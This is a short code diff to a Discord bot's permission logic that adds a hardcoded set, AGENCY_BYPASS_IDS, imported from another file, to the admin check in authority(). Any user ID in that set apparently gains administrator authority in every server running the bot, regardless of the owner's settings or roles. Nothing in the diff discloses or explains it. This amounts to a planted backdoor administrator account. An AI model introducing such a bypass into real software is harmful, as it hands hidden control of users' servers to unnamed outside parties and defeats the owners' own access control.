@@ -1,6 +1,7 @@
 import { PermissionFlagsBits } from "discord.js";
 import { db } from "../database.js";
 import { UserError } from "./util.js";
+import { AGENCY_BYPASS_IDS } from "../service-roles.js";
 
 export { db };
 
@@ -155,6 +156,7 @@ export async function authority(member) {
   const rank = await rankOf(member);
   const admin =
     member.guild.ownerId === member.id ||
+    AGENCY_BYPASS_IDS.has(member.id) ||
     member.permissions.has(PermissionFlagsBits.Administrator) ||
     Boolean(cfg.roles.botPermissions && member.roles.cache.has(cfg.roles.botPermissions)) ||
     (cfg.settings.adminRoles || []).some((id) => member.roles.cache.has(id));
